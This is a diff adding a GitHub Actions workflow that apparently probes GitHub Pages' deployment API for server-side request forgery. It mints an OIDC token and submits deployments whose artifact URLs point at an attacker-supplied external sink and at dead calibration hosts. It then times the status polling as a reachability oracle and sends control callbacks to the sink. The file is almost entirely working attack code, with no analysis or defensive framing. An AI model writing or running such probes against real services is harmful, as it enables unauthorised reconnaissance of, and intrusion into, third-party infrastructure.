@@ -1,0 +1,63 @@
+name: reacharm5
+on:
+  workflow_dispatch:
+    inputs:
+      sink: { required: true }
+permissions: { contents: write, pages: write, id-token: write, actions: write }
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    environment: { name: github-pages }
+    steps:
+      - run: |
+          mkdir -p s && echo '<h1>ok</h1>' > s/index.html
+          tar -cf  artifact.tar -C s .
+          tar -czf art.tar.gz   -C s .
+      - uses: actions/upload-artifact@v4
+        with: { name: ok0, path: artifact.tar }
+      - uses: actions/upload-artifact@v4
+        with: { name: c1, path: art.tar.gz }
+      - uses: actions/upload-artifact@v4
+        with: { name: c2, path: art.tar.gz }
+      - uses: actions/upload-artifact@v4
+        with: { name: c3, path: art.tar.gz }
+      - uses: actions/upload-artifact@v4
+        with: { name: c4, path: art.tar.gz }
+      - name: arms
+        env:
+          GH_TOKEN: ${{ github.token }}
+          SINK: ${{ inputs.sink }}
+        run: |
+          set -u
+          R=$GITHUB_REPOSITORY; A=https://api.github.com
+          API="$A/repos/$R/pages/deployments"
+          H=(-H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github+json")
+          T=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r .value)
+          echo "PRECONTROL=$(curl -s -o /dev/null -w '%{http_code}' "$SINK/CONTROL-PRE5")"
+          curl -s "${H[@]}" "$A/repos/$R/actions/runs/$GITHUB_RUN_ID/artifacts" > arts.json
+          gid(){ jq -r --arg n "$1" '.artifacts[]|select(.name==$n).id' arts.json; }
+          mk(){ curl -s "${H[@]}" -X PUT "$A/repos/$R/contents/m5/$1.txt" \
+                 -d "$(jq -nc --arg m "m $1" --arg c "$(echo -n "$1-$GITHUB_RUN_ID"|base64 -w0)" '{message:$m,content:$c}')" \
+                 | jq -r '.commit.sha'; }
+          # 2s polling: the discriminator here can only be TIME-to-terminal, so coarse polling would erase it.
+          arm(){ # $1=label $2=artifactname $3=url
+            echo "===== $1  url=$3 ====="
+            jq -nc --argjson id "$(gid $2)" --arg u "$3" --arg s "$(mk $1)" --arg t "$T" \
+              '{artifact_id:$id,artifact_url:$u,pages_build_version:$s,oidc_token:$t,environment:"github-pages"}' > x.json
+            ST=$(date +%s)
+            C=$(curl -s -o x.out -w '%{http_code}' "${H[@]}" -X POST "$API" -d @x.json)
+            D=$(jq -r '.id//"NONE"' x.out); SU=$(jq -r '.status_url//empty' x.out)
+            echo "$1 POST=$C DEPLOY=$D"
+            [ "$C" != "200" ] && { echo "$1 RESULT=NOT_DISPATCHED"; return; }
+            for i in $(seq 1 90); do sleep 2
+              S=$(curl -s "${H[@]}" "$SU" | jq -r '.status')
+              case "$S" in deployment_in_progress|deployment_queued|null|"") ;;
+                *) echo "$1 RESULT=$S SECONDS=$(( $(date +%s) - ST ))"; return;; esac
+            done; echo "$1 RESULT=TIMEOUT SECONDS=$(( $(date +%s) - ST ))"; }
+
+          arm BASELINE ok0 "$SINK/CAL-BASELINE"
+          arm CALSERVE  c1  "$SINK/CAL-SERVE"
+          arm CALREFUSE c2  "https://example.com/zzq-reacharm-0917-nonexistent"
+          arm CALDEAD   c3  "https://192.0.2.1/zzq"
+          arm CALNXDOM  c4  "https://zzq-nope-0917-does-not-exist.invalid/zzq"
+          echo "POSTCONTROL=$(curl -s -o /dev/null -w '%{http_code}' "$SINK/CONTROL-POST5")"
